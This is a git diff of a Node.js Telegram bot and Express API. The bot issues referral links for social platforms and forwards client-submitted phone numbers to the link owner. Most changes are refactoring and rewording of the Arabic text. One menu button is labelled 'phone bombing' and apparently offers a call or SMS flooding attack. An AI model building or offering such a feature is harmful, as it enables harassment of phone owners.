@@ -1,6 +1,5 @@
 const TelegramBot = require("node-telegram-bot-api");
 const express = require("express");
-const cors = require("cors");
 const sqlite3 = require("sqlite3").verbose();
 const crypto = require("crypto");
 
@@ -9,24 +8,12 @@ const crypto = require("crypto");
 // ============================================================
 
 const TOKEN = process.env.BOT_TOKEN;
-
 const PORT = process.env.PORT || 3000;
 
 if (!TOKEN) {
-    console.error("❌ BOT_TOKEN غير موجود في Environment Variables");
+    console.error("❌ BOT_TOKEN غير موجود في Railway Variables");
     process.exit(1);
 }
-
-
-// ============================================================
-// Express
-// ============================================================
-
-const app = express();
-
-app.use(cors());
-
-app.use(express.json());
 
 
 // ============================================================
@@ -41,14 +28,51 @@ console.log("✅ Telegram Bot is running...");
 
 
 // ============================================================
-// SQLite
+// Express Server
+// ============================================================
+
+const app = express();
+
+app.use(express.json());
+
+
+// ============================================================
+// CORS بدون مكتبة cors
+// ============================================================
+
+app.use((req, res, next) => {
+
+    res.header(
+        "Access-Control-Allow-Origin",
+        "*"
+    );
+
+    res.header(
+        "Access-Control-Allow-Methods",
+        "GET,POST,PUT,PATCH,DELETE,OPTIONS"
+    );
+
+    res.header(
+        "Access-Control-Allow-Headers",
+        "Content-Type, Authorization"
+    );
+
+    if (req.method === "OPTIONS") {
+        return res.sendStatus(204);
+    }
+
+    next();
+});
+
+
+// ============================================================
+// SQLite Database
 // ============================================================
 
 const db = new sqlite3.Database("./referrals.db");
 
 db.serialize(() => {
 
-    // جدول روابط الإحالة
     db.run(`
         CREATE TABLE IF NOT EXISTS referrals (
             token TEXT PRIMARY KEY,
@@ -57,7 +81,6 @@ db.serialize(() => {
         )
     `);
 
-    // جدول طلبات العملاء
     db.run(`
         CREATE TABLE IF NOT EXISTS requests (
             request_id TEXT PRIMARY KEY,
@@ -74,7 +97,7 @@ console.log("✅ Database is ready");
 
 
 // ============================================================
-// المستخدمون الذين وافقوا على شروط البوت
+// المستخدمون الذين وافقوا على الشروط
 // ============================================================
 
 const acceptedUsers = new Set();
@@ -208,7 +231,7 @@ function getRequest(requestId) {
 
 
 // ============================================================
-// تحديث حالة Request
+// تحديث حالة الطلب
 // ============================================================
 
 function updateRequestStatus(
@@ -246,34 +269,21 @@ function updateRequestStatus(
 
 
 // ============================================================
-// إرسال رسالة Telegram
-// ============================================================
-
-async function sendTelegramMessage(
-    chatId,
-    text,
-    options = {}
-) {
-
-    return bot.sendMessage(
-        chatId,
-        text,
-        options
-    );
-
-}
-
-
-// ============================================================
 // الصفحة الرئيسية
 // ============================================================
 
 app.get("/", (req, res) => {
 
     res.json({
+
         ok: true,
-        service: "Telegram Bot + API",
-        message: "Server is running"
+
+        service:
+            "Telegram Bot + API",
+
+        message:
+            "Server is running"
+
     });
 
 });
@@ -286,16 +296,22 @@ app.get("/", (req, res) => {
 app.get("/health", (req, res) => {
 
     res.json({
+
         ok: true,
-        status: "online",
-        timestamp: new Date().toISOString()
+
+        status:
+            "online",
+
+        timestamp:
+            new Date().toISOString()
+
     });
 
 });
 
 
 // ============================================================
-// إنشاء Referral من API
+// إنشاء Referral
 // ============================================================
 
 app.post(
@@ -312,8 +328,12 @@ app.post(
             if (!telegram_id) {
 
                 return res.status(400).json({
+
                     success: false,
-                    error: "telegram_id is required"
+
+                    error:
+                        "telegram_id is required"
+
                 });
 
             }
@@ -337,7 +357,7 @@ app.post(
         } catch (error) {
 
             console.error(
-                "Referral error:",
+                "❌ Referral error:",
                 error
             );
 
@@ -398,7 +418,10 @@ app.get(
 
         } catch (error) {
 
-            console.error(error);
+            console.error(
+                "❌ Referral lookup error:",
+                error
+            );
 
 
             res.status(500).json({
@@ -417,7 +440,7 @@ app.get(
 
 
 // ============================================================
-// استقبال طلب العميل من الموقع
+// استقبال طلب العميل
 // ============================================================
 
 app.post(
@@ -433,7 +456,7 @@ app.post(
 
 
             // --------------------------------------------
-            // التحقق
+            // التحقق من البيانات
             // --------------------------------------------
 
             if (!chatId) {
@@ -509,36 +532,32 @@ app.post(
 
 
             // --------------------------------------------
-            // رسالة صاحب الرابط
+            // إرسال إشعار لصاحب الرابط
             // --------------------------------------------
 
-            const message =
+            await bot.sendMessage(
+
+                chatId,
 
 `🔔 طلب تواصل جديد
 
-📱 رقم العميل:
+📱 رقم التواصل:
 ${phone}
 
 🆔 رقم الطلب:
 ${requestId}
 
 ⏳ الحالة:
-بانتظار الموافقة`;
+بانتظار الموافقة`,
 
-
-            // --------------------------------------------
-            // أزرار الموافقة والرفض
-            // --------------------------------------------
-
-            await sendTelegramMessage(
-                chatId,
-                message,
                 {
+
                     reply_markup: {
 
                         inline_keyboard: [
 
                             [
+
                                 {
                                     text:
                                         "✅ موافقة",
@@ -554,12 +573,15 @@ ${requestId}
                                     callback_data:
                                         `reject:${requestId}`
                                 }
+
                             ]
 
                         ]
 
                     }
+
                 }
+
             );
 
 
@@ -571,7 +593,9 @@ ${requestId}
 
                 ok: true,
 
-                requestId,
+                requestId:
+
+                    requestId,
 
                 message:
                     "تم إرسال الطلب بنجاح"
@@ -639,7 +663,10 @@ app.get(
 
         } catch (error) {
 
-            console.error(error);
+            console.error(
+                "❌ Check request error:",
+                error
+            );
 
 
             res.status(500).json({
@@ -656,7 +683,7 @@ app.get(
 
 
 // ============================================================
-// زر البوت
+// القائمة الرئيسية
 // ============================================================
 
 function sendMainMenu(chatId) {
@@ -668,11 +695,13 @@ function sendMainMenu(chatId) {
         "👋 أهلاً بك\n\nاختر المنصة:",
 
         {
+
             reply_markup: {
 
                 inline_keyboard: [
 
                     [
+
                         {
                             text:
                                 "📸 Instagram",
@@ -688,9 +717,11 @@ function sendMainMenu(chatId) {
                             callback_data:
                                 "facebook"
                         }
+
                     ],
 
                     [
+
                         {
                             text:
                                 "✈️ Telegram",
@@ -706,9 +737,11 @@ function sendMainMenu(chatId) {
                             callback_data:
                                 "twitter"
                         }
+
                     ],
 
                     [
+
                         {
                             text:
                                 "💬 تفجير هواتف",
@@ -724,6 +757,7 @@ function sendMainMenu(chatId) {
                             callback_data:
                                 "whatsapp"
                         }
+
                     ]
 
                 ]
@@ -738,7 +772,7 @@ function sendMainMenu(chatId) {
 
 
 // ============================================================
-// /start
+// أمر /start
 // ============================================================
 
 bot.onText(
@@ -772,9 +806,7 @@ bot.onText(
 
 
             if (
-                acceptedUsers.has(
-                    chatId
-                )
+                acceptedUsers.has(chatId)
             ) {
 
                 return sendMainMenu(
@@ -803,11 +835,13 @@ ${username}
 باستخدامك للبوت، أنت تقر بأنك قرأت الشروط وتوافق عليها.`,
 
                 {
+
                     reply_markup: {
 
                         inline_keyboard: [
 
                             [
+
                                 {
                                     text:
                                         "✅ أوافق على الشروط",
@@ -815,6 +849,7 @@ ${username}
                                     callback_data:
                                         "accept_terms"
                                 }
+
                             ]
 
                         ]
@@ -828,7 +863,7 @@ ${username}
         } catch (error) {
 
             console.error(
-                "Start error:",
+                "❌ Start error:",
                 error
             );
 
@@ -839,7 +874,7 @@ ${username}
 
 
 // ============================================================
-// Callback Queries
+// أزرار البوت
 // ============================================================
 
 bot.on(
@@ -853,7 +888,7 @@ bot.on(
         try {
 
             // =================================================
-            // الموافقة على شروط البوت
+            // قبول الشروط
             // =================================================
 
             if (
@@ -867,11 +902,14 @@ bot.on(
 
 
                 await bot.answerCallbackQuery(
+
                     query.id,
+
                     {
                         text:
                             "تم قبول الشروط ✅"
                     }
+
                 );
 
 
@@ -899,7 +937,7 @@ ${chatId}
 
 
             // =================================================
-            // الموافقة على طلب العميل
+            // موافقة على طلب
             // =================================================
 
             if (
@@ -923,11 +961,14 @@ ${chatId}
                 if (!request) {
 
                     await bot.answerCallbackQuery(
+
                         query.id,
+
                         {
                             text:
                                 "الطلب غير موجود"
                         }
+
                     );
 
                     return;
@@ -935,18 +976,23 @@ ${chatId}
                 }
 
 
-                // التأكد أن صاحب الطلب هو نفسه
+                // صاحب الرابط فقط يستطيع الموافقة
                 if (
-                    String(request.telegram_id) !==
+                    String(
+                        request.telegram_id
+                    ) !==
                     String(chatId)
                 ) {
 
                     await bot.answerCallbackQuery(
+
                         query.id,
+
                         {
                             text:
                                 "غير مصرح بهذا الطلب"
                         }
+
                     );
 
                     return;
@@ -955,17 +1001,23 @@ ${chatId}
 
 
                 await updateRequestStatus(
+
                     requestId,
+
                     "approved"
+
                 );
 
 
                 await bot.answerCallbackQuery(
+
                     query.id,
+
                     {
                         text:
                             "تمت الموافقة ✅"
                     }
+
                 );
 
 
@@ -973,12 +1025,12 @@ ${chatId}
 
                     chatId,
 
-`✅ تمت الموافقة على الطلب.
+`✅ تمت الموافقة على طلب التواصل.
 
 📱 الرقم:
 ${request.phone}
 
-🆔 الطلب:
+🆔 رقم الطلب:
 ${requestId}`
 
                 );
@@ -990,7 +1042,7 @@ ${requestId}`
 
 
             // =================================================
-            // رفض طلب العميل
+            // رفض طلب
             // =================================================
 
             if (
@@ -1014,11 +1066,14 @@ ${requestId}`
                 if (!request) {
 
                     await bot.answerCallbackQuery(
+
                         query.id,
+
                         {
                             text:
                                 "الطلب غير موجود"
                         }
+
                     );
 
                     return;
@@ -1027,16 +1082,21 @@ ${requestId}`
 
 
                 if (
-                    String(request.telegram_id) !==
+                    String(
+                        request.telegram_id
+                    ) !==
                     String(chatId)
                 ) {
 
                     await bot.answerCallbackQuery(
+
                         query.id,
+
                         {
                             text:
                                 "غير مصرح بهذا الطلب"
                         }
+
                     );
 
                     return;
@@ -1045,17 +1105,23 @@ ${requestId}`
 
 
                 await updateRequestStatus(
+
                     requestId,
+
                     "rejected"
+
                 );
 
 
                 await bot.answerCallbackQuery(
+
                     query.id,
+
                     {
                         text:
                             "تم الرفض ❌"
                     }
+
                 );
 
 
@@ -1063,9 +1129,9 @@ ${requestId}`
 
                     chatId,
 
-`❌ تم رفض الطلب.
+`❌ تم رفض طلب التواصل.
 
-🆔 الطلب:
+🆔 رقم الطلب:
 ${requestId}`
 
                 );
@@ -1077,13 +1143,11 @@ ${requestId}`
 
 
             // =================================================
-            // التحقق من قبول شروط البوت
+            // التحقق من الموافقة
             // =================================================
 
             if (
-                !acceptedUsers.has(
-                    chatId
-                )
+                !acceptedUsers.has(chatId)
             ) {
 
                 await bot.answerCallbackQuery(
@@ -1103,7 +1167,7 @@ ${requestId}`
 
 
             // =================================================
-            // إنشاء الرابط الخاص
+            // إنشاء Referral
             // =================================================
 
             const token =
@@ -1155,7 +1219,7 @@ ${requestId}`
 
 
             // =================================================
-            // إضافة Referral Token
+            // إضافة Token للرابط
             // =================================================
 
             const separator =
@@ -1200,7 +1264,7 @@ ${referralUrl}
 
 
 // ============================================================
-// معالجة أخطاء Telegram
+// أخطاء Telegram
 // ============================================================
 
 bot.on(
@@ -1221,8 +1285,11 @@ bot.on(
 // ============================================================
 
 app.listen(
+
     PORT,
+
     "0.0.0.0",
+
     () => {
 
         console.log("");
@@ -1247,4 +1314,5 @@ app.listen(
         );
 
     }
+
 );
